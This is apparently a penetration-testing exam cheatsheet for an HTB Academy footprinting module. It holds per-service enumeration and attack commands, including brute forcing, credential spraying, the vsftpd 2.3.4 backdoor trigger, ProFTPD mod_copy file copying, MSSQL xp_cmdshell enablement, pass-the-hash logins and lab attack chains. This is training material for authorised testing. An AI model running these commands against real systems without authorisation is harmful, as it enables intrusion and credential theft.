# Footprinting — Exam Cheatsheet

**Distilled from HTB Academy "Footprinting" module + WINMEDIUM (Easy) + NIXHARD (Hard) skills assessments.** Open this during the exam.

---

## The Universal Methodology

```
1. nmap -sCV -p- (TCP) AND -sU --top-ports=100 (UDP — switch to UDP VPN!)
2. For EVERY open port → run the service-specific enum playbook below
3. Banner-grab versions → CVE search
4. Default/anonymous credentials FIRST, brute LAST
5. One found cred → spray everywhere (PAM-backed services share creds)
6. Pivot service → service: SMTP user enum → SSH spray, SNMP secret → POP3 mail → SSH key
```

> **Forever rule:** SNMP/UDP and AXFR are FREE info — never skip them. Most Footprinting boxes hide creds in SNMP MIB or DNS records.

---

## NIXHARD Lesson (memorize)

```
TCP scan: only 22, 110, 143, 993, 995 → looks dead-end
   ↓
SWITCH TO UDP OPENVPN
   ↓
sudo nmap -sU -p161 → SNMP open!
   ↓
onesixtyone -c snmp.txt → community = "backup"
   ↓
snmpwalk -v2c -c backup → /opt/tom-recovery.sh tom NMds732Js2761
   ↓
POP3: USER tom / PASS NMds732Js2761 → email contains SSH private key
   ↓
ssh -i key tom@ → mysql -u tom -p → users.users → htb creds
```

**Key takeaway:** SNMP MIB exposes scheduled jobs & their **plaintext arguments** (passwords on the command line). Always `snmpwalk` once you have a community string.

---

## Per-Service Playbooks

### FTP (21, 2121, 990, 30021…)
```bash
nmap -sCV -p21 TARGET --script "ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor"
ftp -n TARGET                  # then: user anonymous; passive; ls -la
curl ftp://anonymous:x@TARGET/  # one-liner anon test
lftp -u anonymous, TARGET       # mirror with: mirror -c -P 5 .

# Try EVERY FTP port with anon
for p in 21 2121 990 30021; do echo "==$p=="; curl -s --max-time 4 "ftp://anonymous:x@TARGET:$p/"; done

# vsftpd 2.3.4 backdoor (USER ending in :)
echo -e "USER user:)\nPASS x" | nc TARGET 21       # then: nc TARGET 6200

# ProFTPD mod_copy CVE-2015-3306
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/passwd.txt
```

### SMB (139, 445)
```bash
nxc smb TARGET -u '' -p '' --shares                # null
nxc smb TARGET -u guest -p '' --shares             # ⚡ Server 2019 default
nxc smb TARGET -u '' -p '' --users --rid-brute
enum4linux-ng -A TARGET
smbclient -N -L //TARGET
smbclient -N //TARGET/SHARE -c 'prompt OFF; recurse ON; mget *'
smbmap -H TARGET -u '' -p ''
rpcclient -U "" -N TARGET
  > enumdomusers
  > enumdomgroups
  > queryuser <RID>
  > getdompwinfo
```

### NFS (111, 2049)
```bash
showmount -e TARGET
sudo mount -t nfs -o vers=3 TARGET:/export /mnt/nfs
ls -lan /mnt/nfs                   # note UIDs — sudo -u <uid> bash to read

# Common path: /home/user/.ssh/id_rsa
```

### DNS (53)
```bash
dig any @TARGET DOMAIN
dig AXFR @TARGET DOMAIN                                  # ALWAYS try
dig NS @TARGET DOMAIN
nslookup -type=any DOMAIN TARGET
fierce --domain DOMAIN
dnsenum DOMAIN

# Subdomain brute
gobuster dns -d DOMAIN -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 30
```

### SMTP (25, 465, 587)
```bash
nc -nv TARGET 25                                    # banner
nmap --script "smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344" -p25 TARGET

# User enum (3 modes — try all)
smtp-user-enum -M VRFY -U names.txt -t TARGET
smtp-user-enum -M EXPN -U names.txt -t TARGET
smtp-user-enum -M RCPT -U names.txt -t TARGET -D DOMAIN     # most reliable

# Manual
swaks --to test@DOMAIN --from a@b.c --server TARGET
```

### IMAP / POP3 (110, 143, 993, 995)
```bash
nmap --script "imap-capabilities,imap-brute,pop3-capabilities,pop3-brute" -p110,143 TARGET
nc TARGET 110                       # then: USER x / PASS y / LIST / RETR 1
openssl s_client -connect TARGET:995 -crlf -quiet

# Hydra (Dovecot has no default lockout)
hydra -L users.txt -P pws.txt pop3://TARGET
```
> POP3 `+OK` to USER means **no user enumeration** — auth is the only oracle.

### SNMP (UDP 161) — NIXHARD KEY
```bash
# 1. Brute community string (ALWAYS USE UDP VPN)
onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt TARGET
sudo nmap -sU -p161 --script "snmp-brute" TARGET

# 2. Walk the MIB
snmpwalk -v2c -c public TARGET
snmpwalk -v2c -c <STR> TARGET 1.3.6.1.2.1.25.1.6.0           # processes
snmpwalk -v2c -c <STR> TARGET 1.3.6.1.2.1.25.4.2.1.2         # process names
snmpwalk -v2c -c <STR> TARGET 1.3.6.1.2.1.25.4.2.1.5         # process args ← creds!
snmpwalk -v2c -c <STR> TARGET 1.3.6.1.4.1.77.1.2.25          # Windows users
snmpwalk -v2c -c <STR> TARGET 1.3.6.1.2.1.6.13.1.3           # TCP local ports

# Common community strings: public, private, manager, backup, write, internal
```

### MSSQL (1433)
```bash
nmap --script "ms-sql-info,ms-sql-empty-password,ms-sql-config,ms-sql-tables" -p1433 TARGET
mssqlclient.py -windows-auth USER@TARGET                     # impacket
nxc mssql TARGET -u U -p P --local-auth -q "SELECT IS_SRVROLEMEMBER('sysadmin')"
# enable cmd exec (sysadmin):
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### MySQL (3306)
```bash
mysql -h TARGET -u root              # try blank password
mysql -h TARGET -u root -p
nmap --script "mysql-info,mysql-empty-password,mysql-databases,mysql-users,mysql-dump-hashes,mysql-audit" -p3306 TARGET
# Once in:
SHOW DATABASES; USE x; SHOW TABLES; SELECT * FROM users;
```

### Oracle TNS (1521)
```bash
nmap --script "oracle-sid-brute,oracle-tns-version" -p1521 TARGET
odat all -s TARGET -p 1521
odat sidguesser -s TARGET -p 1521
odat passwordguesser -s TARGET -p 1521 -d <SID> --accounts-file accounts.txt
sqlplus user/pass@TARGET:1521/<SID>
# Common SIDs: XE, ORCL, ORACLE, PROD, DEV, TEST
```

### IPMI (UDP 623)
```bash
sudo nmap -sU -p623 --script ipmi-version TARGET
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_version; set RHOSTS TARGET; run; exit"
msfconsole -q -x "use auxiliary/scanner/ipmi/ipmi_dumphashes; set RHOSTS TARGET; run; exit"
# IPMI 2.0 RAKP HMAC-SHA1 hash → hashcat -m 7300
```

### Linux Remote Mgmt (SSH=22, R-services=512/513/514, Telnet=23)
```bash
nc -nv TARGET 23                                         # banner
hydra -L users.txt -P pws.txt rsh://TARGET               # rlogin trust files
ssh-audit TARGET                                         # crypto posture
ssh -Q cipher | head                                     # local-supported
```

### Windows Remote Mgmt (RDP=3389, WinRM=5985/5986, RPC=135)
```bash
nxc rdp   TARGET -u U -p P
xfreerdp /v:TARGET /u:U /p:P /cert:ignore /dynamic-resolution /clipboard
nxc winrm TARGET -u U -p P
evil-winrm -i TARGET -u U -p P
evil-winrm -i TARGET -u U -H NTHASH                      # PtH
```

---

## WINMEDIUM Lesson (Windows footprinting)

Typical chain on a Windows footprinting box:
```
nxc smb TARGET -u guest -p '' --shares
  → readable share has cred file or .kdbx
  → keepass2john + hashcat -m 13400 → master pw
  → open vault → cred A
  → nxc winrm TARGET -u A -p PW       (Pwn3d!)
  → flag in C:\Users\Administrator\Desktop\
```

Key files to grep on shares:
```
*.kdbx *.psafe3 *.config *.xml unattend.xml sysprep.xml *.ps1 *.bat *.vbs creds.txt password.txt
```

---

## Banner Grabbing (when -sV is "tcpwrapped")

```bash
nc -nv TARGET PORT
echo -e "GET / HTTP/1.0\r\n\r\n" | nc TARGET 80
openssl s_client -connect TARGET:443 -servername TARGET
curl -sI http://TARGET
telnet TARGET PORT
```

---

## STUCK? Triage

| Symptom | Fix |
|---------|-----|
| Only SSH+POP3 open, can't get in | switch to UDP VPN, scan SNMP |
| SNMP `Timeout: No Response` | wrong community OR TCP VPN — switch to UDP OpenVPN |
| Anon FTP rejected | try other ftp ports (2121, 30021); try `ftp:ftp` `admin:admin` |
| AXFR refused | try child zones (acme.com → dev.acme.com); `dig NS` first |
| SMB null denied | `guest:''` (Server 2019); `--shares` not `--users` |
| MSSQL `Login failed for sa` | sa disabled — `--local-auth` Windows accounts |
| Found `id_rsa` but ssh asks pass | `ssh2john id_rsa > h; john --wordlist=rockyou h` |
| POP3 RETR shows nothing | try IMAP `LOGIN; SELECT INBOX; FETCH 1 BODY[]` |
| Oracle SID brute empty | try defaults: XE, ORCL, ORACLE, PROD; `odat sidguesser` |

---

## Hashcat modes for footprinting hashes

| Hash | -m |
|------|----|
| Linux `$6$` shadow | 1800 |
| KeePass `.kdbx` | 13400 |
| PuTTY ppk | 22931 |
| OpenSSH id_rsa (encrypted) | 22921 |
| Oracle 11g/12c | 112 / 12300 |
| MSSQL 2012/14 | 1731 |
| MySQL 4.1+ | 300 |
| IPMI 2.0 RAKP | 7300 |
| MD5-crypt | 500 |

---

## References

- [Enumeration_Methodology.md](Enumeration_Methodology.md), [Enumeration_Principles.md](Enumeration_Principles.md)
- [WINMEDIUM_Easy.md](WINMEDIUM_Easy.md), [NIXHARD_Hard.md](NIXHARD_Hard.md)
- Per-service files: [FTP.md](FTP.md), [SMB.md](SMB.md), [NFS.md](NFS.md), [DNS.md](DNS.md), [SMTP.md](SMTP.md), [IMAP_POP3.md](IMAP_POP3.md), [SNMP.md](SNMP.md), [MSSQL.md](MSSQL.md), [MySQL.md](MySQL.md), [Oracle_TNS.md](Oracle_TNS.md), [IPMI.md](IPMI.md), [Linux_Remote_Management.md](Linux_Remote_Management.md), [Windows_Remote_Management.md](Windows_Remote_Management.md)
